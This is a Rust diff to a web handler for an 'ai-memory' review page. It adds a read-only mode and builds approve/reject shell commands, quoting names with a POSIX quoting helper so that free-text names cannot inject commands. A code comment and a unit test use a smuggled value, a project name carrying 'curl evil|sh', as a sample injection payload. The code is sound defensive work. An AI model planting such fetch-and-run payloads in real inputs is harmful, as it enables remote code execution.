@@ -8,7 +8,7 @@
 
 use std::sync::Arc;
 
-use ai_memory_core::AuthLevel;
+use ai_memory_core::{AuthLevel, LegacyBrowserAuth};
 use ai_memory_store::{PendingAutoImproveReview, PendingAutoImproveScope};
 use askama::Template;
 use axum::Extension;
@@ -53,6 +53,7 @@ pub(crate) struct PendingQuery {
 pub(crate) async fn handler(
     State(state): State<Arc<WebState>>,
     level: Option<Extension<AuthLevel>>,
+    legacy: Option<Extension<LegacyBrowserAuth>>,
     Query(query): Query<PendingQuery>,
 ) -> Response {
     if let Err(response) = super::require_admin(&state, level).await {
@@ -123,6 +124,7 @@ pub(crate) async fn handler(
             project_count: scopes.len(),
             truncated,
             limit: PENDING_REVIEW_LIMIT,
+            read_only: legacy.is_some(),
         },
         StatusCode::OK,
     )
@@ -173,8 +175,13 @@ fn pending_row(review: PendingAutoImproveReview) -> PendingRow {
     let staged_relative = jiff::Timestamp::from_microsecond(summary.staged_at)
         .map(|ts| humanize(&ts.to_string()))
         .unwrap_or_default();
+    let id = summary.id.to_string();
+    let cli_approve = cli_command("approve", &id, &review.workspace_name, &review.project_name);
+    let cli_reject = cli_command("reject", &id, &review.workspace_name, &review.project_name);
     PendingRow {
-        id: summary.id.to_string(),
+        id,
+        cli_approve,
+        cli_reject,
         scope_label: label,
         target_href: page_href(&review.workspace_name, &review.project_name, &target_path),
         workspace: review.workspace_name,
@@ -194,9 +201,57 @@ fn pending_row(review: PendingAutoImproveReview) -> PendingRow {
     }
 }
 
+/// The `ai-memory pending-writes <verb>` command a reviewer pastes into a
+/// shell. Workspace and project names are free text, so each argument is
+/// quoted: a project named `x; curl … | sh` must stay one argument instead of
+/// running when root pastes the line.
+fn cli_command(verb: &str, id: &str, workspace: &str, project: &str) -> String {
+    format!(
+        "ai-memory pending-writes {verb} {} --workspace {} --project {}",
+        posix_quote(id),
+        posix_quote(workspace),
+        posix_quote(project)
+    )
+}
+
+/// Quote one POSIX shell argument: unchanged when it holds only characters a
+/// shell never interprets, otherwise single-quoted with embedded `'` escaped.
+fn posix_quote(text: &str) -> String {
+    if !text.is_empty()
+        && text
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | '/' | ':' | '@'))
+    {
+        return text.to_owned();
+    }
+    format!("'{}'", text.replace('\'', "'\\''"))
+}
+
 fn render(view: impl Template, status: StatusCode) -> Response {
     match view.render() {
         Ok(body) => (status, Html(body)).into_response(),
         Err(_) => StatusCode::INTERNAL_SERVER_ERROR.into_response(),
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    /// A project or workspace name with shell syntax stays one quoted
+    /// argument; plain names are left readable.
+    #[test]
+    fn cli_commands_quote_names_with_shell_syntax() {
+        assert_eq!(
+            cli_command("approve", "abc123", "default", "my-app"),
+            "ai-memory pending-writes approve abc123 --workspace default --project my-app"
+        );
+        let hostile = cli_command("reject", "abc123", "team ws", "x'; curl evil|sh;'");
+        assert_eq!(
+            hostile,
+            "ai-memory pending-writes reject abc123 --workspace 'team ws' \
+             --project 'x'\\''; curl evil|sh;'\\'''"
+        );
+        assert_eq!(posix_quote(""), "''");
     }
 }
